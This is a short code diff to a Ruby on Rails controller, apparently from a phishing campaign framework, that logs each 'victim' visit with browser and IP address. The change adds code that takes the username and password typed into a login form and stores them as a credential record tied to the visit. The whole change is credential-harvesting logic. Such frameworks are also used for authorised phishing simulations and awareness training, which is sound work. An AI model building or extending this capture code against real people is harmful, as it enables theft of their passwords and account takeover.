@@ -19,7 +19,15 @@ class SiteDeliveryController < ApplicationController
     visit.victim_id = victim.id
     visit.browser = request.env['HTTP_USER_AGENT']
     visit.ip_address = request.env['HTTP_X_FORWARDED_FOR'] || request.remote_ip
-    visit.extra = "SOURCE: EMAIL"
+    visit.extra = extra
+
+    if params[:PasswordForm]
+      credential = Credential.new
+      credential.username = params[:UsernameForm].to_s
+      credential.password = params[:PasswordForm].to_s
+      credential.visit = visit
+    end
+
     visit.save unless victim.id == '000000'
 
     visit
